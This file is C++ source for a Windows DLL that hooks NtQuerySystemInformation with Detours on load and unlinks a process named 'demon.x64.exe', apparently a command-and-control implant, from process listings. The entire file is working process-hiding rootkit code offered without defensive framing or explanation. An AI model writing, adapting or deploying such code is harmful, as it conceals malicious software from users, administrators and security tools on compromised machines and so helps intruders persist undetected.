#include "defs.h"
#include "detours.h"
#include <Psapi.h>
#include <iostream>

#define TOHIDE L"demon.x64.exe"



typedef NTSTATUS(NTAPI* fnNtQuerySystemInformation)(_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation, _In_ ULONG SystemInformationLength,_Out_opt_ PULONG ReturnLength);
fnNtQuerySystemInformation ogNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");

NTSTATUS hkNtQuerySystemInformation(_In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength) {


    NTSTATUS STATUS  = ogNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	PSYSTEM_PROCESS_INFORMATION current;
	PSYSTEM_PROCESS_INFORMATION next;

    if (SystemInformationClass == SystemProcessInformation && STATUS == 0)
    {
        current = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		next = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)current + current->NextEntryOffset);

        
        while (next->NextEntryOffset != NULL) {
			if (_wcsicmp(next->ImageName.Buffer, TOHIDE) == 0)
            {
                current->NextEntryOffset += next->NextEntryOffset;
            }
			current = next;
			next = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)current + current->NextEntryOffset);
		}
    }

    return STATUS;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	
	if (ul_reason_for_call == DLL_PROCESS_ATTACH)
	{
		DetourTransactionBegin();
		DetourAttach(&(PVOID&)ogNtQuerySystemInformation, hkNtQuerySystemInformation);
		DetourTransactionCommit();
	
	}

	return TRUE;
}

